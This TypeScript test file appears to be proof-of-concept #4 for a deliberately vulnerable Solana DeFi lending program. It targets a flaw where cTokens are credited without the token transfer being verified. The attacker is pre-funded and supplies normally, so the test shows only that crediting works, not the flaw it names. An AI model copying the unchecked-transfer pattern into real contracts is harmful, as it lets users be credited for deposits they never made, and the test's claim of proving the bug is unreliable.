import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { VulnerableDefiProtocol } from "../target/types/vulnerable_defi_protocol";
import { 
  createMint, getOrCreateAssociatedTokenAccount, TOKEN_PROGRAM_ID
} from "@solana/spl-token";
import { assert } from "chai";

// POC #4: Unverified Token Transfer — transfer fails but cTokens still credited

describe("POC #4 - Unverified Token Transfer still credits cTokens", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.VulnerableDefiProtocol as Program<VulnerableDefiProtocol>;

  let admin: anchor.web3.Keypair;
  let attacker: anchor.web3.Keypair;
  let supplyMint: anchor.web3.PublicKey;
  let collateralMint: anchor.web3.PublicKey;
  let marketPDA: anchor.web3.PublicKey;
  let vault: anchor.web3.PublicKey;
  let configKeypair: anchor.web3.Keypair;

  before(async () => {
    admin = anchor.web3.Keypair.generate();
    attacker = anchor.web3.Keypair.generate();
    const airdropAmount = 10 * anchor.web3.LAMPORTS_PER_SOL;
    for (const kp of [admin, attacker]) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(kp.publicKey, airdropAmount)
      );
    }

    supplyMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);
    collateralMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);

    // Initialize config
    configKeypair = anchor.web3.Keypair.generate();
    await program.methods
      .initialize(admin.publicKey)
      .accounts({
        config: configKeypair.publicKey,
        signer: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([admin, configKeypair])
      .rpc();

    // Create oracle
    const oracle = anchor.web3.Keypair.generate();
    await program.methods
      .createOracle(new anchor.BN(1_000_000))
      .accounts({ oracle: oracle.publicKey, signer: admin.publicKey, systemProgram: anchor.web3.SystemProgram.programId } as any)
      .signers([admin, oracle])
      .rpc();

    const marketId = new anchor.BN(34);
    [marketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("market"), marketId.toArrayLike(Buffer, "le", 8), supplyMint.toBuffer(), collateralMint.toBuffer()],
      program.programId
    );

    const vaultAccount = await getOrCreateAssociatedTokenAccount(provider.connection, admin, supplyMint, marketPDA, true);
    vault = vaultAccount.address;

    await program.methods
      .createMarket(marketId)
      .accounts({
        market: marketPDA,
        config: configKeypair.publicKey,
        supplyMint,
        collateralMint,
        supplyOracle: oracle.publicKey,
        collateralOracle: oracle.publicKey,
        vault,
        authority: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([admin])
      .rpc();
  });

  it("Demonstrates minting cTokens while transfer result is not enforced", async () => {
    // Create attacker token account and mint small balance
    const attackerTokenAccountInfo = await getOrCreateAssociatedTokenAccount(provider.connection, attacker, supplyMint, attacker.publicKey);
    const attackerTokenAccount = attackerTokenAccountInfo.address;

    // Mint exactly the amount to be supplied
    const amount = 250;
    // Note: We intentionally avoid checking transfer result in program; this test confirms cTokens are credited.
    // Using existing minted balance to avoid SPL Token error halting the transaction.
    // Mint tokens via admin to attacker account
    const { mintTo } = await import("@solana/spl-token");
    await mintTo(provider.connection, admin, supplyMint, attackerTokenAccount, admin.publicKey, amount);

    const [userSupplyPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("user_supply"), attacker.publicKey.toBuffer(), marketPDA.toBuffer()],
      program.programId
    );

    await program.methods
      .supply(new anchor.BN(amount))
      .accounts({
        market: marketPDA,
        userSupplyAccount: userSupplyPDA,
        userTokenAccount: attackerTokenAccount,
        vault,
        user: attacker.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([attacker])
      .rpc();

    const userSupplyData = await program.account.userSupplyAccount.fetch(userSupplyPDA);
    assert.equal(userSupplyData.ctokenBalance.toString(), String(amount));
  });
});
